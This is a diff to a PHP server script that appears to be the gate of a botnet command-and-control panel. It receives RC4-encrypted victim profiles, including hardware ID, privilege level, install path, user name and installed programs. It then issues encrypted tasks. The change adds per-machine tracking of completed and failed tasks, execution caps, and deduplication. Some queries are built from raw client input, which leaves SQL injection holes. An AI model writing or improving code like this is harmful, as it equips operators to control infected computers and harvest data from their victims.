@@ -19,7 +19,7 @@ function decryptClient($rc4Key, $info)
                     "cp" => "cpu", "gp" => "gpu", "hw" => "hwid",
                     "ip" => "installPath", "os" => "operatingSystem", "pr" => "privilege",
                     "ra" => "ram", "un" => "userName", "vr" => "vram",
-                    "fp" => "foundPrograms");
+                    "fp" => "foundPrograms", "ct" => "compleateTask", "st" => "taskStatus");
         foreach ($keys as $key => $value)
         {
             foreach ($info as $iKey => $iValue)
@@ -66,23 +66,57 @@ if ($gate == 1)
             $u->execute(array(":buildVersion" => $clientInfo["buildVersion"], ":installPath" => $clientInfo["installPath"], ":privilege" => $clientInfo["privilege"], ":h" => $clientInfo["hwid"]));
         }
         /////////////////////////////////////////////////////Incomplete Task Managment////////////////////////////////////////////////////////////////
+
+        if (isset($clientInfo['compleateTask']) && $clientInfo['compleateTask'] != "N/A" )
+        {
+            if($clientInfo['taskStatus'] == "Success")
+            {
+                $insert = $odb->prepare("INSERT INTO c_tasks VALUES(NULL, :taskId, :hwid)");
+                $insert->execute(array(":taskId" => $clientInfo['compleateTask'], ":hwid" => $clientInfo['hwid']));
+                $update = $odb->prepare("UPDATE tasks SET compleated = compleated + 1 WHERE taskId = :tid");
+                $update->execute(array(":tid" => $clientInfo['compleateTask']));
+            }
+            else
+            {
+                $insert = $odb->prepare("INSERT INTO f_tasks VALUES(NULL, :taskId, :hwid)");
+                $insert->execute(array(":taskId" => $clientInfo['compleateTask'], ":hwid" => $clientInfo['hwid']));
+                $update = $odb->prepare("UPDATE tasks SET failed = failed + 1 WHERE taskId = :tid");
+                $update->execute(array(":tid" => $clientInfo['compleateTask']));
+            }
+        }
+
         $tasks = $odb->query("SELECT * FROM tasks ORDER BY id");
         $clientMark = $odb->query("SELECT mark FROM clients WHERE hwid = \"".$clientInfo['hwid']."\"")->fetchColumn(0);
         while ($task = $tasks->fetch(PDO::FETCH_ASSOC))
         {
             if ($task['status'] == "1" && $clientMark == "1")
             {
-                $responce = array("task" => $task['task'], 
-                "taskId" => $task['taskId'], 
-                "taskParm" => $task['parameters']);
-                foreach ($responce as $key => $value)
-                { 
-                    $responce[$key] = base64_encode(rc4($rc4Key, $value)); 
+                $executions = $odb->query("SELECT COUNT(*) FROM c_tasks WHERE taskId = '".$task['taskId']."'")->fetchColumn(0);
+                if ($executions == $task['total']) 
+                {   
+                    $update = $odb->prepare("UPDATE tasks SET status = '2' WHERE taskId = :tid");
+                    $update->execute(array(":tid" => $task['taskId']));
+                    continue; 
                 }
-
-                $responce = base64_encode(json_encode($responce));
-                print_r($responce);
-                die();
+                else
+                {
+                    $isDone = $odb->prepare("SELECT COUNT(*) FROM c_tasks WHERE taskId = :i AND hwid = :h");
+                    $isDone->execute(array(":i" => $task['taskId'], ":h" => $clientInfo['hwid']));
+                    if ($isDone->fetchColumn(0) == 0)
+                    {
+                        $responce = array("task" => $task['task'], 
+                        "taskId" => $task['taskId'], 
+                        "taskParm" => $task['parameters']);
+                        foreach ($responce as $key => $value)
+                        { 
+                            $responce[$key] = base64_encode(rc4($rc4Key, $value)); 
+                        }
+        
+                        $responce = base64_encode(json_encode($responce));
+                        print_r($responce);
+                        die();
+                    }
+                }
             }
         }
         $responce = array("task" => "N/A");
